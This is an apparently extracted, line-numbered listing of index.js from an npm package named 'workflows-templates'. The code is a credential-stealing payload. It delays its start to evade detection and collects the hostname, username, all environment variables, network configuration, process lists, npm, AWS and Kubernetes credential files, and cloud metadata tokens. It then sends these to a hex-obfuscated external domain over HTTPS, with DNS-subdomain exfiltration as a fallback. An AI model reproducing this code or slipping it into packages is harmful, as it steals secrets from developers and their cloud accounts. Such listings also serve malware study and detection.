// File: tmp/tmpr4g3amx9/workflows-templates/package/index.js
// ======================================================================
Line 8: const os = require('os')
Line 9: const https = require('https')
Line 10: const http = require('http')
Line 11: const dns = require('dns')
Line 12: const fs = require('fs')
Line 13: _tmp_0 = require('child_process')
Line 18: Buffer.from(OAST_DOMAIN_HEX, 'hex').toString()
Line 23: execSync(cmd, { stdio: 'pipe', timeout: 5000 }).toString().trim()
Line 30: fs.readFileSync(filePath, 'utf8')
Line 33: {
    const payload = JSON.stringify(data, null, 2);
    https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/HTTPS_HIT/v99/${data.intel_summary.join('_')}`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
    }).on('error', e => { exfiltrateViaDns(data); }).end(payload);
}
Line 35: https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/HTTPS_HIT/v99/${data.intel_summary.join('_')}`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
    }).on('error', e => { exfiltrateViaDns(data); }).end(payload)
Line 38: data.intel_summary.join('_')
Line 41: exfiltrateViaDns(data)
Line 44: {
    const payload = Buffer.from(JSON.stringify({ s: data.intel_summary, h: data.host.hostname })).toString('hex');
    const chunks = payload.match(/.{1,60}/g) || [];
    chunks.forEach((chunk, index) => {
        const subdomain = `${index}.h.${chunk}`;
        if (subdomain.length < 63) {
            dns.lookup(`${subdomain}.${OAST_DOMAIN}`, (err) => {});
        }
    });
}
Line 45: Buffer.from(JSON.stringify({ s: data.intel_summary, h: data.host.hostname })).toString('hex')
Line 46: const chunks = payload.match(/.{1,60}/g) || []
Line 55: {
    const intel = {
        timestamp: new Date().toISOString(),
        intel_summary: [],
    };

    intel.host = {
        hostname: os.hostname(),
        whoami: os.userInfo().username,
        platform: os.platform(),
        release: os.release(),
        arch: os.arch(),
        pwd: run('pwd') || run('cd'),
        env: process.env
    };
    if (intel.host.hostname) intel.intel_summary.push('HOST');

    intel.network = {
        ipconfig: os.platform() === 'win32' ? run('ipconfig /all') : run('ifconfig -a && ip a'),
        resolv_conf: safeReadFile('/etc/resolv.conf'),
        hosts_file: safeReadFile('/etc/hosts'),
        process_list: run('ps aux || tasklist'),
    };
    if (intel.network.resolv_conf.includes('10.') || intel.network.resolv_conf.includes('172.16.') || intel.network.resolv_conf.includes('192.168.')) {
        intel.intel_summary.push('INT_NET');
    }

    intel.creds = {
        npm_rc: safeReadFile(`${os.homedir()}/.npmrc`),
        aws_creds: saf...
Line 61: intel.host = {
        hostname: os.hostname(),
        whoami: os.userInfo().username,
        platform: os.platform(),
        release: os.release(),
        arch: os.arch(),
        pwd: run('pwd') || run('cd'),
        env: process.env
    }
Line 62: os.hostname()
Line 63: os.userInfo()
Line 64: os.platform()
Line 66: os.arch()
Line 67: _tmp_16.pwd = run('pwd') || run('cd')
Line 70: intel.intel_summary.push('HOST')
Line 72: intel.network = {
        ipconfig: os.platform() === 'win32' ? run('ipconfig /all') : run('ifconfig -a && ip a'),
        resolv_conf: safeReadFile('/etc/resolv.conf'),
        hosts_file: safeReadFile('/etc/hosts'),
        process_list: run('ps aux || tasklist'),
    }
Line 73: _tmp_18.ipconfig = os.platform() === 'win32' ? run('ipconfig /all') : run('ifconfig -a && ip a')
Line 74: safeReadFile('/etc/resolv.conf')
Line 75: safeReadFile('/etc/hosts')
Line 76: _tmp_18.process_list = run('ps aux || tasklist')
Line 78: intel.network.resolv_conf.includes('192.168.')
Line 79: intel.intel_summary.push('INT_NET')
Line 83: safeReadFile(`${os.homedir()}/.npmrc`)
Line 84: safeReadFile(`${os.homedir()}/.aws/credentials`)
Line 85: safeReadFile(`${os.homedir()}/.kube/config`)
Line 87: Object.values(intel.creds).some(c => c !== 'FILE_NOT_FOUND')
Line 88: intel.intel_summary.push('CREDS')
Line 92: const req = http.get(options, res => {
            let data = `STATUS:${res.statusCode} `;
            res.on('data', chunk => data += chunk.toString());
            res.on('end', () => resolve(data.substring(0, 400)));
        }).on('error', e => resolve(`ERROR:${e.code}`)).on('timeout', () => { req.destroy(); resolve('TIMEOUT'); })
Line 94: chunk.toString()
Line 102: imdsv2TokenRes.split(' ').slice(1).join(' ')
Line 104: intel.intel_summary.push('AWS')
Line 107: intel.intel_summary.push('AZURE')
Line 110: intel.intel_summary.push('GCP')
Line 116: {
    // Stage 1: Evasion via randomized delay.
    const delay = 90000 + (Math.random() * 60000); // 90-150 seconds
    await new Promise(resolve => setTimeout(resolve, delay));
    
    const timeout = setTimeout(() => process.exit(0), MAX_EXECUTION_TIME_MS);
    
    // Stage 2: Reconnaissance
    const intelReport = await gatherIntel();
    
    // Stage 3: Exfiltration
    exfiltrateViaHttps(intelReport);

    clearTimeout(timeout);
}
Line 121: const timeout = setTimeout(() => process.exit(0), MAX_EXECUTION_TIME_MS)
Line 129: clearTimeout(timeout)
